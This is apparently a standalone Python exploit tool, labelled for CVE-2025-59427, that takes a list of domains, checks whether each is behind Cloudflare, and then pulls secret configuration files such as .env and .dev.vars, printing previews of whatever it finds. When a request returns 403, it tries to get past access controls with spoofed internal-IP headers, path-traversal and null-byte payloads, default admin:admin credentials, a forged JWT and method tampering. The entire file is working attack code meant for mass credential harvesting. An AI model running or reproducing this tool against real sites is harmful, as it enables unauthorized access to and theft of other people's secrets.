import requests
import dns.resolver
import argparse
import sys
from urllib.parse import urlparse, urlunparse, quote, unquote
import urllib3
import random
import time
from itertools import product

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

class Bypass403:    
    def __init__(self, base_url):
        self.base_url = base_url
        self.parsed_url = urlparse(base_url)
        self.successful_attempts = []
        self.request_count = 0
        self.max_requests = 50
        
    def get_user_agent(self):
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'curl/7.68.0',
            'Wget/1.20.3',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            ''
        ]
        return random.choice(agents)
    
    def generate_internal_ips(self):
        return [
            '127.0.0.1', 'localhost', '0.0.0.0', '192.168.0.1', '192.168.1.1',
            '10.0.0.1', '172.16.0.1', '::1', '127.0.0.1:80', '127.0.0.1:8080',
            '127.0.0.1:443', 'localhost:80', 'localhost:8080'
        ]
    
    def generate_path_payloads(self, original_path):
        path_payloads = []
        encoded_path = quote(original_path)
        double_encoded = quote(encoded_path)
        special_chars = [';', '..', '...', './', '/.', '//', '/./', '/../',
                        '?', '#', '*', '~', '%20', '%09', '%00', '%0a', '%0d',
                        '.json', '.xml', '.txt', '.bak', '.old', '.orig']
        
        for char in special_chars:
            path_payloads.append(f"{original_path}{char}")
            path_payloads.append(f"{char}{original_path}")
            path_payloads.append(f"{original_path[:-1]}{char}/")
        
        traversal = ['../', '..\\', '..;/', '%2e%2e%2f', '%2e%2e%5c']
        for trav in traversal:
            path_payloads.append(f"{trav}{original_path}")
            path_payloads.append(f"{original_path}{trav}")
        
        path_payloads.extend([
            original_path.upper(),
            original_path.lower(),
            original_path.title(),
            original_path.replace('.', ''),
            original_path.replace('/', ''),
            encoded_path,
            double_encoded,
            unquote(original_path) if '%' in original_path else original_path,
        ])
        
        null_payloads = ['%00', '%2500', '\\0', '\\x00', '\\u0000']
        for null in null_payloads:
            path_payloads.append(f"{original_path}{null}")
            path_payloads.append(f"{original_path}{null}.html")
        
        path_payloads.append(f"{original_path}:$DATA")
        path_payloads.append(f"{original_path}::$INDEX_ALLOCATION")
        
        return list(set(path_payloads))
    
    def generate_header_combinations(self):
        base_headers = {}
        base_headers['User-Agent'] = self.get_user_agent()
        internal_ips = self.generate_internal_ips()
        
        header_variations = [
            {
                'X-Forwarded-For': random.choice(internal_ips),
                'X-Real-IP': random.choice(internal_ips),
                'X-Original-URL': self.parsed_url.path,
                'X-Rewrite-URL': self.parsed_url.path,
                'X-Originating-IP': random.choice(internal_ips),
                'X-Remote-IP': random.choice(internal_ips),
                'X-Remote-Addr': random.choice(internal_ips),
                'X-Client-IP': random.choice(internal_ips),
                'X-Host': random.choice(internal_ips),
                'X-Forwarded-Host': 'localhost',
                'Forwarded': f'for={random.choice(internal_ips)};host=localhost',
                'Referer': f'{self.parsed_url.scheme}://localhost{self.parsed_url.path}',
                'Origin': f'{self.parsed_url.scheme}://localhost',
            },
            {
                'X-Forwarded-For': '127.0.0.1',
                'X-Client-IP': '127.0.0.1',
                'CF-Connecting-IP': '127.0.0.1',
                'True-Client-IP': '127.0.0.1',
                'X-WAP-Profile': 'http://localhost/wap.xml',
            },
            {
                'X-Custom-IP-Authorization': '127.0.0.1',
                'X-Forwarded-Proto': 'http',
                'X-Forwarded-Port': '80',
                'X-Forwarded-Scheme': 'http',
            }
        ]
        
        auth_headers = {
            'Authorization': 'Basic YWRtaW46YWRtaW4=',  # admin:admin
            'X-Api-Key': 'test',
            'X-Auth-Token': 'test',
            'Bearer': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJsb2NhbGhvc3QiLCJpYXQiOjE2MDAwMDAwMDAsImV4cCI6MTkwMDAwMDAwMCwiYXVkIjoid3d3LmV4YW1wbGUuY29tIiwic3ViIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
        }
        
        combinations = []
        for headers in header_variations:
            combined = {**base_headers, **headers}
            combinations.append(combined)
            for auth_key, auth_val in auth_headers.items():
                with_auth = combined.copy()
                with_auth[auth_key] = auth_val
                combinations.append(with_auth)
        
        return combinations
    
    def intelligent_403_bypass(self):
        results = []
        header_combos = self.generate_header_combinations()
        path_payloads = self.generate_path_payloads(self.parsed_url.path)
        print(f"{Colors.YELLOW}[*] Phase 1: Testing header variations ({len(header_combos)} combinations){Colors.RESET}")
        for headers in header_combos[:10]:  # Batasi 10 header pertama dulu
            if self.request_count >= self.max_requests:
                break
            try:
                response = requests.get(
                    self.base_url,
                    headers=headers,
                    timeout=8,
                    verify=False,
                    allow_redirects=True
                )
                self.request_count += 1
                
                if response.status_code != 403:
                    results.append({
                        'url': self.base_url,
                        'headers': headers,
                        'status': response.status_code,
                        'method': 'header_only'
                    })
                    return results
                    
            except Exception as e:
                continue
        
        print(f"{Colors.YELLOW}[*] Phase 2: Testing path variations ({len(path_payloads)} variations){Colors.RESET}")
        for path in path_payloads[:15]:  # Batasi 15 path pertama
            if self.request_count >= self.max_requests:
                break
                
            new_url = urlunparse((
                self.parsed_url.scheme,
                self.parsed_url.netloc,
                path,
                self.parsed_url.params,
                self.parsed_url.query,
                self.parsed_url.fragment
            ))
            
            try:
                response = requests.get(
                    new_url,
                    headers={'User-Agent': self.get_user_agent()},
                    timeout=8,
                    verify=False,
                    allow_redirects=True
                )
                self.request_count += 1
                
                if response.status_code != 403:
                    results.append({
                        'url': new_url,
                        'headers': {'User-Agent': self.get_user_agent()},
                        'status': response.status_code,
                        'method': 'path_only'
                    })
                    return results
                    
            except Exception as e:
                continue
        print(f"{Colors.YELLOW}[*] Phase 3: Testing strategic combinations{Colors.RESET}")
        
        strategic_combinations = [
            {
                'headers': {'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1'},
                'paths': ['../' + self.parsed_url.path, self.parsed_url.path + '/..']
            },
            {
                'headers': {'Referer': f'http://localhost{self.parsed_url.path}'},
                'paths': [quote(self.parsed_url.path), self.parsed_url.path + '%00']
            },
            {
                'headers': {'Authorization': 'Basic YWRtaW46YWRtaW4='},
                'paths': [self.parsed_url.path + ';', self.parsed_url.path + '?']
            }
        ]
        
        for combo in strategic_combinations:
            for path in combo['paths']:
                if self.request_count >= self.max_requests:
                    break
                    
                new_url = urlunparse((
                    self.parsed_url.scheme,
                    self.parsed_url.netloc,
                    path,
                    self.parsed_url.params,
                    self.parsed_url.query,
                    self.parsed_url.fragment
                ))
                
                try:
                    response = requests.get(
                        new_url,
                        headers=combo['headers'],
                        timeout=8,
                        verify=False,
                        allow_redirects=True
                    )
                    self.request_count += 1
                    
                    if response.status_code != 403:
                        results.append({
                            'url': new_url,
                            'headers': combo['headers'],
                            'status': response.status_code,
                            'method': 'strategic_combo'
                        })
                        return results
                        
                except Exception as e:
                    continue
        
        print(f"{Colors.YELLOW}[*] Phase 4: Testing HTTP method variations{Colors.RESET}")
        methods = ['HEAD', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH', 'TRACE']
        
        for method in methods:
            if self.request_count >= self.max_requests:
                break
                
            try:
                if method == 'POST':
                    response = requests.post(
                        self.base_url,
                        headers={'User-Agent': self.get_user_agent()},
                        timeout=8,
                        verify=False,
                        data={'test': 'test'}
                    )
                else:
                    response = requests.request(
                        method,
                        self.base_url,
                        headers={'User-Agent': self.get_user_agent()},
                        timeout=8,
                        verify=False
                    )
                
                self.request_count += 1
                
                if response.status_code != 403:
                    results.append({
                        'url': self.base_url,
                        'headers': {'User-Agent': self.get_user_agent()},
                        'status': response.status_code,
                        'method': f'http_{method}'
                    })
                    return results
                    
            except Exception as e:
                continue
        
        return results

def get_user_agent():
    return {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}

def resolve_smart_protocol(domain):
    if "://" in domain:
        parsed = urlparse(domain)
        domain = parsed.netloc
    
    print(f"{Colors.CYAN}[*] Resolving protocol for: {domain}...{Colors.RESET}")
    
    protocols = ['https', 'http']
    
    for proto in protocols:
        url = f"{proto}://{domain}"
        try:
            requests.get(url, timeout=5, headers=get_user_agent(), verify=False)
            return url
        except requests.exceptions.RequestException:
            continue
            
    return None

def check_is_using_cloudflare(url):
    try:
        response = requests.get(url, timeout=10, allow_redirects=True, headers=get_user_agent(), verify=False)
        headers = response.headers
        cookies = response.cookies

        if 'Server' in headers and 'cloudflare' in headers['Server'].lower():
            return True, "Server Header"
        if 'CF-RAY' in headers:
            return True, "CF-RAY Header"
        if 'CF-Cache-Status' in headers:
            return True, "CF-Cache-Status Header"            
        for cookie in cookies:
            if cookie.name in ['__cf_bm', 'cf_clearance', '__cfduid']:
                return True, f"Cookie ({cookie.name})"
                
        return False, None
    except requests.exceptions.RequestException:
        return False, None

def check_cloudflare_dns(domain):
    try:
        if "://" in domain:
            domain = urlparse(domain).netloc
            
        answers = dns.resolver.resolve(domain, 'NS')
        for rdata in answers:
            ns_target = str(rdata.target).lower()
            if 'cloudflare.com' in ns_target:
                return True, ns_target
        return False, None
    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.LifetimeTimeout):
        return False, None
    except Exception:
        return False, None

def check_sensitive_files(url):
    targets = ['.env', '.dev.vars', 'wrangler.toml', 'package.json']
    found_vulnerabilities = []
    print(f"{Colors.CYAN}[*] Probing {url} for sensitive configuration files...{Colors.RESET}")
    
    for target in targets:
        target_url = f"{url.rstrip('/')}/{target}"
        
        try:
            response = requests.get(
                target_url, 
                timeout=10, 
                headers=get_user_agent(), 
                verify=False, 
                stream=True
            )
            
            if response.status_code == 200:
                content_snippet = next(response.iter_content(2048)).decode('utf-8', errors='ignore')
                
                is_html = "<html" in content_snippet.lower() or "<!doctype html" in content_snippet.lower()
                
                valid_leak = False
                
                if target in ['.env', '.dev.vars']:
                    if "=" in content_snippet and not is_html:
                        valid_leak = True
                elif target == 'wrangler.toml':
                    if ("name =" in content_snippet or "[site]" in content_snippet) and not is_html:
                        valid_leak = True
                elif target == 'package.json':
                    if "{" in content_snippet and "\"dependencies\"" in content_snippet and not is_html:
                        valid_leak = True

                if valid_leak:
                    print(f"{Colors.GREEN}[!] CRITICAL LEAK FOUND: {target_url}{Colors.RESET}")
                    print(f"{Colors.YELLOW}    Preview: {content_snippet[:100].replace(chr(10), ' ')}...{Colors.RESET}")
                    found_vulnerabilities.append(target_url)
                else:
                    print(f"[-] {target} returned 200 but looks like HTML/Invalid (False Positive).")
            
            elif response.status_code == 403:
                print(f"{Colors.YELLOW}[*] 403 Forbidden detected for {target}. Launching 403 bypass...{Colors.RESET}")
                
                bypass_engine = Bypass403(target_url)
                bypass_results = bypass_engine.intelligent_403_bypass()
                
                if bypass_results:
                    for result in bypass_results:
                        if result['status'] == 200:
                            bypass_response = requests.get(
                                result['url'],
                                headers=result['headers'],
                                timeout=10,
                                verify=False,
                                stream=True
                            )
                            
                            content_snippet = next(bypass_response.iter_content(2048)).decode('utf-8', errors='ignore')
                            
                            is_html = "<html" in content_snippet.lower() or "<!doctype html" in content_snippet.lower()
                            valid_leak = False
                            
                            if target in ['.env', '.dev.vars']:
                                if "=" in content_snippet and not is_html:
                                    valid_leak = True
                            elif target == 'wrangler.toml':
                                if ("name =" in content_snippet or "[site]" in content_snippet) and not is_html:
                                    valid_leak = True
                            elif target == 'package.json':
                                if "{" in content_snippet and "\"dependencies\"" in content_snippet and not is_html:
                                    valid_leak = True
                            
                            if valid_leak:
                                print(f"{Colors.GREEN}[!] CRITICAL LEAK FOUND (via 403 bypass): {result['url']}{Colors.RESET}")
                                print(f"{Colors.YELLOW}    Method: {result['method']}")
                                print(f"{Colors.YELLOW}    Headers: {result['headers']}")
                                print(f"{Colors.YELLOW}    Preview: {content_snippet[:100].replace(chr(10), ' ')}...{Colors.RESET}")
                                found_vulnerabilities.append(result['url'])
                                break
                        else:
                            print(f"[-] Bypass attempt returned {result['status']} for {target}")
                else:
                    print(f"[-] All bypass attempts failed for {target}")
            
            else:
                print(f"[-] {target} returned {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            print(f"{Colors.RED}[-] Error checking {target}: {str(e)[:50]}{Colors.RESET}")

    if not found_vulnerabilities:
        print(f"[-] No sensitive files exposed on {url}")

    return found_vulnerabilities

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-59427 Cloudflare & Vite/Wrangler with Simple 403 Bypass")
    parser.add_argument("-u", "--url", help="Single domain/URL to check", required=False)
    parser.add_argument("-f", "--file", help="File containing list of domains", required=False)
    parser.add_argument("--max-requests", type=int, default=50, help="Max requests per target (default: 50)")
    
    args = parser.parse_args()

    raw_domains = []

    if args.url:
        raw_domains.append(args.url)
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                raw_domains = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}Error: File not found.{Colors.RESET}")
            sys.exit(1)
    else:
        print("Please provide a URL (-u) or a file (-f)")
        sys.exit(1)

    print(f"{Colors.YELLOW}--- Starting Bypass 403 Scan on {len(raw_domains)} targets ---{Colors.RESET}\n")
    print(f"{Colors.CYAN}[*] 403 bypass engine activated{Colors.RESET}")
    print(f"{Colors.CYAN}[*] Max requests per target: {args.max_requests}{Colors.RESET}\n")

    for raw_domain in raw_domains:
        final_url = resolve_smart_protocol(raw_domain)
        
        if not final_url:
            print(f"{Colors.RED}[-] Could not resolve protocol/connect to {raw_domain}. Skipping.{Colors.RESET}")
            continue

        print(f"{Colors.YELLOW}--- Analyzing: {final_url} ---{Colors.RESET}")
    
        is_cf_header, cf_header_method = check_is_using_cloudflare(final_url)
        is_cf_dns, cf_dns_method = check_cloudflare_dns(final_url)

        is_behind_cloudflare = is_cf_header or is_cf_dns

        if is_behind_cloudflare:
            methods = []
            if is_cf_header: methods.append(f"Header ({cf_header_method})")
            if is_cf_dns: methods.append(f"DNS ({cf_dns_method})")
            
            print(f"{Colors.GREEN}[+] Cloudflare Detected via: {', '.join(methods)}{Colors.RESET}")
            
            check_sensitive_files(final_url)
        else:
            print(f"[-] No Cloudflare detected for {final_url}. Skipping specific checks.")
        
        print("-" * 40)

if __name__ == "__main__":
    main()